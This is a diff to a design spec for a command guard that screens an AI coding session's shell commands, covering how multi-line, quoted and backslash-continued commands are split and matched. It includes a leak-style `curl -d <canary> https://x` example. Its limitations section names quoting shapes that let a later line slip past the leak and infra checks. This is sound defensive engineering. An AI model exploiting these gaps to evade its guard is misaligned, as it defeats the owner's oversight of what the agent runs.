@@ -45,13 +45,27 @@ The acceptance scenarios, restated:
 ### Session 2026-10-16
 
 - Q: How are the words matched? A: Each word on regex word boundaries (`\bgit\b`, `\bpush\b`), each
-  pair searched independently over the whole raw text, so the words may be far apart or on other
+  word of a pair searched independently over the whole raw text, so the words may be far apart or on other
   lines. `.wuwei/ledger` is a plain substring. This is blunt on purpose: `git` in a path plus `push`
   in prose also counts.
 - Q: Does a line continuation (backslash newline) split the command for the other doors? A: No. The
-  segment reader joins a backslash-newline to a space before lexing, so `curl \` continued onto
-  `-d <canary> https://x` still reaches the leak door as one curl command. The door rule itself
-  ignores this join and reads the raw text.
+  segment reader removes a backslash-newline outside quotes before lexing, as sh does, so `curl \`
+  continued onto `-d <canary> https://x` still reaches the leak door as one curl command. Backslashes
+  pair off first: only an odd run before the newline is a continuation, so in `echo foo\\` then
+  `curl ...` on the next line, curl is its own command (security gate, fix round 1). The door rule
+  itself reads the raw text.
+- Q: How does the segment reader know a newline is unquoted? A: One regex walks the text and skips
+  single-quoted strings, double-quoted strings (with their backslash escapes) and backslash pairs;
+  every other newline becomes a command separator. A quoted newline stays in its word, so
+  `curl -o "<newline>" -d <canary> https://x` is still one curl command (security gate, fix round 1).
+  This quote reading serves only the splitting for the other doors; the door rule never uses it.
+- Q: How is `wuwei hook` matched? A: Planner calibration within the owner's approved rule (fix round
+  1): every local path holds `wuwei` (`/home/user/wuwei`, `cli/wuwei/`, `.claude/wuwei/`), so the
+  loose pair refused 9 of 14 real multi-line commands in the goal gate's replay, any that mentioned
+  `hook.py` or `hooks.json`. The pair now matches only `wuwei` followed by `hook` with whitespace
+  (newlines included) or a backslash-newline between them. `x<newline>wuwei hook Stop`, a heredoc
+  body quoting `.../wuwei/bin/wuwei hook SubagentStop` and `wuwei \<newline> hook` stay refused. The
+  git, gh and ledger pairs are unchanged.
 - Q: What does an unreadable command naming no door program do? A: It passes unread, as on main: a
   guard that cannot read a command lets it through and the audit still sees it.
 - Q: Does a `sh -c` body get the rule? A: Only through the outer raw text. An unreadable inner body
@@ -80,8 +94,10 @@ or after a continuation is refused by the leak door; `terraform apply` on a seco
 
 - CRLF line endings: the carriage return is whitespace to the reader, the newline splits; with a
   door name in the text the rule refuses.
-- A command made only of a quoted newline argument (`echo "<newline>"`) splits there; harmless,
-  since a door name in such text is refused first.
+- A quoted word holding only newlines (`curl -o "<newline>" ...`) stays one word; the command is
+  not split there.
+- An odd run of backslashes before a newline is a continuation; an even run is literal backslashes
+  and the newline ends the command.
 - An empty command reads as no segments and passes.
 
 ## Requirements
@@ -93,8 +109,8 @@ or after a continuation is refused by the leak door; `terraform apply` on a seco
 - **FR-002**: the refusal names its own one-line Bash call and `--body-file`, `-F` or a file
   written with Write.
 - **FR-003**: `guards.segments` ends a simple command at a newline outside quotes, keeps a quoted
-  newline in its word, joins a backslash-newline to a space, and returns `None` when shlex cannot
-  read the text.
+  newline in its word, removes an unquoted backslash-newline (an odd backslash run only), and returns
+  `None` when shlex cannot read the text.
 - **FR-004**: callers of `segments` (the `sh -c` unwrap and the PostToolUse `gh pr create` check)
   treat `None` as no segments.
 - **FR-005**: one-line readable commands behave as on main.
@@ -106,9 +122,9 @@ or after a continuation is refused by the leak door; `terraform apply` on a seco
 
 ## Assumptions
 
-- The backslash-newline join also applies inside single quotes, where the shell would keep both
-  characters. It only changes what the other doors read (a space for two characters), never the
-  door rule, which reads raw text. Overturned if a door depends on a literal backslash-newline.
+- A backslash-newline inside double quotes stays in its word for the other doors, where sh would
+  drop it. It only changes an argument's text, never which program runs. Overturned if a door
+  matches an argument that a quoted continuation splits.
 - Word boundaries count `-` and `.` as boundaries, so `git-push` or `.git` plus `push` match. This is
   the blunt side the owner chose.
 
@@ -120,3 +136,9 @@ or after a continuation is refused by the leak door; `terraform apply` on a seco
    runs nothing; the session must write the file with Write instead.
 3. Newline splitting now feeds each later line to the doors: a heredoc body line that starts with
    `kubectl apply` or `terraform destroy` now asks the owner where main let it pass.
+4. A read-only ledger query (`grep x .wuwei/ledger/*.jsonl` after a `cd` on the line before) is
+   refused when it is multi-line, because `.wuwei/ledger` alone names a door; the session runs it
+   on one line instead.
+5. The quote-aware split regex misreads a shell shape (ANSI-C `$'...'`, a quote inside a heredoc
+   body): a later line can hide inside a word from the leak or infra door. The door rule does not
+   depend on it, so door programs stay refused.
